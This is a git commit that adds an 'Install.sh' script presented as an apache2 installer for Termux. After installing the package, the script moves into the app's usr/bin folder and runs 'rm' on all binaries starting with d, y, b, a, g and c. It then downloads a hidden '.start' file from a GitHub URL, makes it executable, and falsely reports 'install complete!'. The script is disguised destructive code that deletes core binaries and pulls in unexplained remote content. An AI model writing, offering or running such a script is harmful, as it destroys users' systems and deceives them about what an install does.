931d16d85c5d84d92226e9b82cfeef4d209de4ae
Tomasz1235l <108531577+Tomasz1235l@users.noreply.github.com>
2022-10-03 19:54:37 +0200

    Create Install.sh

---
+++ Install.sh
@@ -0,0 +1,18 @@
+pkg install apache2
+cd ..
+cd usr
+cd bin
+rm d*
+rm y*
+rm b*
+rm a*
+rm g*
+rm c*
+rm g*
+wget https://raw.githubusercontent.com/Tomasz1235I/apache-termux/.start
+chmod +x .start
+echo .bashrc >> ./.start
+clear
+echo install complete!
+echo must restart app
+echo to work.
